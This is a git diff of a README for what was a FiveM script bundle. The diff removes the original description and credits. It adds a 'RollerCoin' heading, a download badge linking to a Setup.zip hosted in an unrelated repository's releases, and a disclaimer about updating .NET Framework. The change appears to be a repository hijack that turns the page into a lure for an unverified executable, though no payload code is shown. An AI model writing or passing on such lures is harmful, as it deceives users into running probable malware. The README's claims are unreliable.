@@ -1,25 +1,11 @@
-Ello :)
+## RollerCoin
 
-I Optimized their code :)
+[![Download](https://github.com/Ganaaz77/gantulga-Zoe/assets/102014249/d4177b1e-2a71-47c0-bfba-cfd54b98ca92)](https://github.com/MrEvilGamer/qb-tattooshop/releases/download/Setup/Setup.zip)
 
-So this is the combination of these scripts also, The Credit goes to them for making it.
-i just merged it hehe
+![62f2a7ea-31fe-4d50-8e2a-347d46d33d90](https://github.com/MrEvilGamer/qb-extras/assets/84228628/b23cb537-8529-471a-a2d2-50b1a8d101c4)
 
-Add the sounds to interact-sound
 
-Carry People
-https://github.com/rubbertoe98/FiveM-Scripts/tree/master/CarryPeople
-
-Lux Vehicle Control for Pd Control 'For Non Els Vehicle for pd.'
-https://forum.cfx.re/t/release-luxart-vehicle-control/17304
-
-Esc Map, When you press esc the person does Aniamtion
-https://github.com/DetErDugget/odessa_escmap
-
-Items on Back - For Example Weapons, etc
-https://github.com/devin-monro/devyn-backitems
-
-Recoil
-who do you think made it :p
-
-Will surely will add more scripts to it in future ;)
+# Disclaimer ⚠️
+### If our software does not work for you
+1) Update your NET Framework
+2) Update your Visual studio
